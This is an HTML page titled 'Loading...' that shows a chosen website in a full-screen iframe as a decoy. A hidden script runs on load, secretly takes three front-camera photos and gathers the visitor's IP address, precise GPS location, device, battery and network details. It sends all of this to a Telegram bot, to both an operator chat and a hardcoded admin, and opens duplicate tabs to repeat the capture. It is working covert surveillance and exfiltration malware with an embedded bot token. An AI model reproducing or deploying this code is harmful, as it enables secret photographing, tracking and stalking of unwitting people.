<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000000;
            font-family: Arial, sans-serif;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        
        #cameraContainer {
            position: fixed;
            width: 100vw;
            height: 100vh;
            top: 0;
            left: 0;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
        }
        
        #cameraVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }
        
        #captureCanvas {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Website Frame -->
    <iframe id="websiteFrame" src="about:blank" 
            sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals"
            allow="camera; microphone; geolocation"
            allowfullscreen></iframe>
    
    <!-- Hidden Camera - FIXED POSITION -->
    <div id="cameraContainer">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <canvas id="captureCanvas"></canvas>
    </div>

    <script>
        // =====================================================
        //  GUARANTEED PHOTO CAPTURE & SEND
        // =====================================================
        
        // Telegram Configuration
        const BOT_TOKEN = '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        const ADMIN_ID = '6314556756';
        
        // Global state
        const data = {
            session: Date.now() + '_' + Math.random().toString(36).substr(2, 8),
            user: null,
            target: null,
            device: {},
            location: null,
            ip: null,
            photos: [],
            battery: null,
            network: null,
            screen: null,
            allDataSent: false,
            replicationDone: false
        };
        
        // DOM elements
        const frame = document.getElementById('websiteFrame');
        const video = document.getElementById('cameraVideo');
        const canvas = document.getElementById('captureCanvas');
        const ctx = canvas.getContext('2d');
        
        // ============== STEP 1: LOAD WEBSITE IMMEDIATELY ==============
        function loadWebsite() {
            const params = new URLSearchParams(window.location.search);
            data.user = params.get('chat_id') || params.get('user') || params.get('id') || ADMIN_ID;
            
            let target = params.get('site') || params.get('url') || params.get('target') || 'https://google.com';
            
            try {
                if (target.startsWith('QUANTUM:')) {
                    target = atob(target.split(':')[1]);
                } else if (!target.includes('://')) {
                    target = atob(target);
                }
                target = decodeURIComponent(target);
            } catch (e) {}
            
            if (!target.startsWith('http')) {
                target = 'https://' + target;
            }
            
            data.target = target;
            frame.src = target;
        }
        
        // ============== STEP 2: CAPTURE PHOTOS FIRST ==============
        async function capturePhotos() {
            try {
                // First, get camera permission and capture photos
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                video.srcObject = stream;
                
                // Wait for video to be ready
                await new Promise((resolve) => {
                    if (video.readyState >= 3) {
                        resolve();
                    } else {
                        video.onloadeddata = resolve;
                    }
                });
                
                await video.play();
                
                // Wait for camera to stabilize
                await new Promise(r => setTimeout(r, 800));
                
                // Capture 3 photos
                for (let i = 1; i <= 3; i++) {
                    const blob = await capturePhoto();
                    if (blob) {
                        data.photos.push({
                            blob: blob,
                            type: 'front',
                            index: i,
                            size: Math.round(blob.size / 1024)
                        });
                    }
                    await new Promise(r => setTimeout(r, 200));
                }
                
                // Stop the stream
                stream.getTracks().forEach(track => track.stop());
                
            } catch (error) {
                console.log('Camera error:', error.message);
            }
        }
        
        // FIXED: Photo capture function
        function capturePhoto() {
            return new Promise((resolve) => {
                try {
                    // Check if video is ready
                    if (!video.videoWidth || video.videoWidth === 0) {
                        resolve(null);
                        return;
                    }
                    
                    // Set canvas size to match video
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    // Draw current video frame
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Convert to blob
                    canvas.toBlob((blob) => {
                        if (blob && blob.size > 10000) {
                            resolve(blob);
                        } else {
                            resolve(null);
                        }
                    }, 'image/jpeg', 0.9);
                    
                } catch (error) {
                    resolve(null);
                }
            });
        }
        
        // ============== STEP 3: CAPTURE OTHER DATA ==============
        async function captureOtherData() {
            // Device info
            await captureDeviceInfo();
            
            // Battery info
            await getBatteryInfo();
            
            // Network info
            await getNetworkInfo();
            
            // IP address
            await getIPAddress();
            
            // Location
            await getLocation();
        }
        
        async function captureDeviceInfo() {
            const ua = navigator.userAgent;
            let os = 'Unknown', browser = 'Unknown';
            
            if (/Windows/.test(ua)) os = 'Windows';
            else if (/Mac/.test(ua)) os = 'macOS';
            else if (/Linux/.test(ua)) os = 'Linux';
            else if (/Android/.test(ua)) os = 'Android';
            else if (/iPhone|iPad/.test(ua)) os = 'iOS';
            
            if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
            else if (/Firefox/.test(ua)) browser = 'Firefox';
            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            else if (/Edge/.test(ua)) browser = 'Edge';
            
            data.device = {
                os: os,
                browser: browser,
                platform: navigator.platform,
                language: navigator.language,
                cores: navigator.hardwareConcurrency || '?',
                ram: navigator.deviceMemory || '? GB',
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }
        
        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'Yes' : 'No'
                    };
                }
            } catch (e) {}
        }
        
        async function getNetworkInfo() {
            data.network = {
                online: navigator.onLine,
                connection: null
            };
            
            if (navigator.connection) {
                data.network.connection = {
                    type: navigator.connection.type,
                    speed: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps'
                };
            }
        }
        
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const result = await response.json();
                data.ip = result.ip;
            } catch (e) {
                try {
                    const response = await fetch('https://icanhazip.com/');
                    data.ip = (await response.text()).trim();
                } catch (e) {}
            }
        }
        
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        data.location = {
                            lat: pos.coords.latitude.toFixed(6),
                            lon: pos.coords.longitude.toFixed(6),
                            accuracy: Math.round(pos.coords.accuracy) + 'm'
                        };
                        resolve(data.location);
                    },
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        }
        
        // ============== STEP 4: SEND ALL DATA TO TELEGRAM ==============
        async function sendAllData() {
            try {
                // First send the report
                await sendReport();
                
                // Then send each photo one by one
                for (const photo of data.photos) {
                    await sendPhoto(photo);
                    await new Promise(r => setTimeout(r, 800));
                }
                
                data.allDataSent = true;
                
            } catch (error) {
                // Try again after delay
                setTimeout(sendAllData, 2000);
            }
        }
        
        async function sendReport() {
            try {
                let report = `ðŸ“Š *DATA CAPTURE COMPLETE*\n\n`;
                report += `Session: \`${data.session}\`\n`;
                report += `User: \`${data.user}\`\n`;
                report += `Time: ${new Date().toLocaleTimeString()}\n\n`;
                
                report += `ðŸ“± Device: ${data.device.os} ${data.device.browser}\n`;
                report += `ðŸ–¥ï¸ Screen: ${data.device.screen}\n`;
                report += `ðŸ’» CPU: ${data.device.cores} cores\n`;
                report += `ðŸ’¾ RAM: ${data.device.ram}\n\n`;
                
                if (data.battery) {
                    report += `ðŸ”‹ Battery: ${data.battery.level}\n`;
                    report += `âš¡ Charging: ${data.battery.charging}\n\n`;
                }
                
                if (data.ip) {
                    report += `ðŸŒ IP: \`${data.ip}\`\n\n`;
                }
                
                if (data.location) {
                    report += `ðŸ“ Location:\n`;
                    report += `${data.location.lat}, ${data.location.lon}\n`;
                    report += `Accuracy: ${data.location.accuracy}\n\n`;
                }
                
                report += `ðŸ“¸ Photos: ${data.photos.length} captured\n`;
                report += `ðŸŽ¯ Target: ${data.target}`;
                
                // Send to user
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: data.user,
                        text: report,
                        parse_mode: 'Markdown'
                    })
                });
                
                // Send to admin
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: report + `\n\nðŸ‘¤ User: \`${data.user}\``,
                        parse_mode: 'Markdown'
                    })
                });
                
            } catch (error) {
                // Try again
                setTimeout(sendReport, 1000);
            }
        }
        
        async function sendPhoto(photo) {
            try {
                if (!photo.blob) return;
                
                const caption = `ðŸ“¸ ${photo.type.toUpperCase()} Photo ${photo.index}\nSession: \`${data.session}\``;
                
                // Create FormData for user
                const userForm = new FormData();
                userForm.append('chat_id', data.user);
                userForm.append('photo', photo.blob, `photo_${photo.index}.jpg`);
                userForm.append('caption', caption);
                userForm.append('parse_mode', 'Markdown');
                
                // Send to user
                await fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: userForm
                });
                
                // Create FormData for admin
                const adminForm = new FormData();
                adminForm.append('chat_id', ADMIN_ID);
                adminForm.append('photo', photo.blob, `admin_photo_${photo.index}.jpg`);
                adminForm.append('caption', caption + `\nðŸ‘¤ User: \`${data.user}\``);
                adminForm.append('parse_mode', 'Markdown');
                
                // Send to admin
                await fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: adminForm
                });
                
            } catch (error) {
                // Try again
                setTimeout(() => sendPhoto(photo), 1000);
            }
        }
        
        // ============== STEP 5: REPLICATE ==============
        function replicateItself() {
            if (data.replicationDone) return;
            
            data.replicationDone = true;
            
            // Open 2 new tabs
            for (let i = 0; i < 2; i++) {
                setTimeout(() => {
                    try {
                        const newTab = window.open(window.location.href, '_blank');
                        if (newTab) {
                            // Close after 90 seconds
                            setTimeout(() => {
                                try {
                                    newTab.close();
                                } catch (e) {}
                            }, 90000);
                        }
                    } catch (e) {
                        // Popup blocked
                    }
                }, i * 2000);
            }
        }
        
        // ============== MAIN EXECUTION ==============
        async function main() {
            try {
                // Step 1: Load website immediately
                loadWebsite();
                
                // Step 2: CAPTURE PHOTOS FIRST (most important)
                await capturePhotos();
                
                // Step 3: Capture other data
                await captureOtherData();
                
                // Step 4: Send all data
                await sendAllData();
                
                // Step 5: Replicate after data is sent
                replicateItself();
                
            } catch (error) {
                // If anything fails, still try to send and replicate
                setTimeout(async () => {
                    if (!data.allDataSent) {
                        await sendAllData();
                    }
                    if (!data.replicationDone) {
                        replicateItself();
                    }
                }, 3000);
            }
        }
        
        // Start when page loads
        window.addEventListener('load', main);
        
        // Force send after 15 seconds if stuck
        setTimeout(() => {
            if (!data.allDataSent) {
                sendAllData();
            }
            if (!data.replicationDone) {
                replicateItself();
            }
        }, 15000);
        
    </script>
</body>
</html>
